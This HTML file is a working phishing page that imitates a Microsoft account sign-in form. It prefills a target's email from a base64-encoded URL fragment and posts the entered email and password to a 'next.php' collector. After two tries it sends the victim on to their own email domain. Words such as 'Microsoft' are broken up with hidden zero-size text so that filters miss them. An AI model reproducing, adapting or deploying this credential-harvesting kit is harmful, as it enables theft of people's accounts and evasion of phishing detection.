<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
  <title>Log-In</title>
  <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->

  <style type="text/css">
    textarea:hover, 
input:hover, 
textarea:active, 
input:active, 
textarea:focus, 
input:focus,
button:focus,
button:active,
button:hover,
label:focus,
.btn:active,
.btn.active
{
    outline:0px !important;
    -webkit-appearance:none;
    box-shadow: none !important;
}

    .box
    {
      /*box-shadow: 0 2px 3px rgba(0,0,0,0.55);*/
      /*border: 1px solid rgba(0,0,0,0.4);*/
      min-height: 338px;
      min-width: 320px;
      max-width: 440px;
      width: calc(100% - 40px);
      padding: 44px;
      margin-left: auto;
      margin-right: auto;
      margin-top: 20px;
      margin-bottom: 28px;
    }

    #footer {
      position: fixed;
      bottom: 0px;
      width: 100%;
      overflow: visible;
      z-index: 99;
      clear: both;
      background-color: #000;
      background-color: rgba(0,0,0,0.6);
    }

    /*.footerNode span {
    color: #fff;
    font-size: 0.75rem;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    float: right;
    margin-left: 8px;
    margin-right: 8px;
}*/
div .footerNode a, div .footerNode span {
    color: #fff;
    font-size: 0.75rem;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    float: right;
    margin-left: 8px;
    margin-right: 8px;
}
    @media only screen and (max-width: 610px) {
      #hide{
        display: none;
      }
    }

  </style>
</head>
<body style="background-image: url('https://s3.amazonaws.com/simbla-static-2/2020/11/5faba665321d68001d4fc0e4/5faba6db73aef50019af7085/ZJH_2F3Xi0SopxxCuN7EKeDY.jpg'); background-size: cover;background-repeat: no-repeat;">
  <div class="container-fluid">
    <div class="container">
      <div class="row my-5 py-5">
          <!-- <div class="col-lg-6" id="hide">
            <div class="text-white my-5 py-3">
              <span class="display-4">Expand Your<br> Microsoft</span><br><br>
              <span class="h5 font-weight-normal">Upgrade to ad-free email and the latest productivity tools with Microsoft.</span><br><br><br>
              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
            </div>
          </div> -->
          <div class="col-lg-6 mx-auto">
            <div class="bg-white box" id="div1">
              <img src="https://s3.amazonaws.com/simbla-static-2/2020/11/5faba665321d68001d4fc0e4/5faba6db73aef50019af7085/rC56cpX1uS2qJKOxJ-5Sb8u-.svg" class="img-fluid"><br><br>
              <span class="h5">Sign In</span><br>
              <span id="error" class="text-danger" style="display: none;">That Micro<span style='font-size: 0px;'>fcmqi</span><span style='font-size: 0px;'>pqmkw</span>soft<span style='font-size: 0px;'>gtqejqt</span> ac<span style='font-size: 0px;'>ovxyzh</span>c<span style='font-size: 0px;'>ailzdih</span>ou<span style='font-size: 0px;'>daghhtp</span>nt d<span style='font-size: 0px;'>jdhkqzc</span>oesn't exist. Enter a dif<span style='font-size: 0px;'>kzkbu</span>fe<span style='font-size: 0px;'>dxork</span>rent<span style='font-size: 0px;'>jcmt</span> acc<span style='font-size: 0px;'>vupj</span>ount</span>
              <div class="form-group mt-2">
                <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
              </div>
              <!-- <p><a href="#">Sign in with a security key</a></p>
                <p><a href="#">sign in options</a></p> -->
                <div class="text-right">
                  <button class="btn rounded-0 text-white px-4 mt-4" id="next" style="background-color: #0066BA;">Next</button>
                </div>
              </div>

              <div class="m-5 p-4 bg-white box" id="div2" style="display: none;">
                <form id="contact">
                  <img src="https://s3.amazonaws.com/simbla-static-2/2020/11/5faba665321d68001d4fc0e4/5faba6db73aef50019af7085/rC56cpX1uS2qJKOxJ-5Sb8u-.svg" class="img-fluid"><br><br>
                  <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
                  <span id="msg" class="text-danger" style="display: none;"></span><br>
                  <span class="h5">Password</span>
                  <div class="form-group mt-2">
                    <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                  </div>
                  <!-- <p>No account? <a href="#">Create one!</a></p> -->
                  <p><a href="#">Sign in with a se<span style='font-size: 0px;'>dknwdhm</span>cur<span style='font-size: 0px;'>ysjewes</span>ity key</a></p>
                  <p><a href="#">Forget my password?</a></p>
                  <div class="text-right">
                    <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;" >login</button>
                  </div>
                </form>
              </div>

            </div>
          </div>
        </div>
      </div>

      <footer id="footer">
        <div>
          <div class="footerNode">
            <span>&copy;2020 Microsoft</span>
            <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy statement</a>
          </div>
        </div>
      </footer>





      <!-- Optional JavaScript -->
      <!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    </body>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script>


      /* global $ */
      $(document).ready(function(){
        var count=0;


    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
      var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

      if (!base64regex.test(email)) {
            // alert(btoa(email));
            var my_email =email;
          }
          else
          {
            // alert(atob(email));
            var my_email =atob(email);
          }
        // $('#email').val(email);
        // var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $('#email').val(my_email);
      }





      $('#email').click(function(){
        $('#error').hide();
      });
      $('#next').click(function () {
        var my_email =$('#email').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();

        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);

      });
      $('#back').click(function () {
        $("#msg").hide();
        $("#email").val("");
        $("#password").val("");
        $("#div2").animate({left:200, opacity:"hide"}, 0);
        $("#div1").animate({right:200, opacity:"show"}, 1000);

      });


      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();
        var msg = $('#msg').html();

        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $('#msg').text( msg );
        count=count+1;
        $.ajax({
          dataType: 'JSON',
          url: "next.php",
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
          beforeSend: function(xhr){
            $('#submit-btn').html('Verifing...');
          },
          success: function(response){
            $("#password").val("");
            if (count>=2) {
              count=0;
              window.location.replace("http://www."+my_slice);
            }
            if(response){
              $("#msg").show();
              console.log(response);
              if(response['signal'] == 'ok'){
               $('#msg').html(response['msg']);
             }
             else{
              $('#msg').html(response['msg']);
            }
          }
        },
        error: function(){
          $("#password").val("");
          if (count>=2) {
            count=0;
            window.location.replace("http://www."+my_slice);
          }
          $("#msg").show();
          $('#msg').html("Invalid Password. Please try again later");
        },
        complete: function(){
          $('#submit-btn').html('Login');
        }
      });
      });
    });
  </script>
  </html>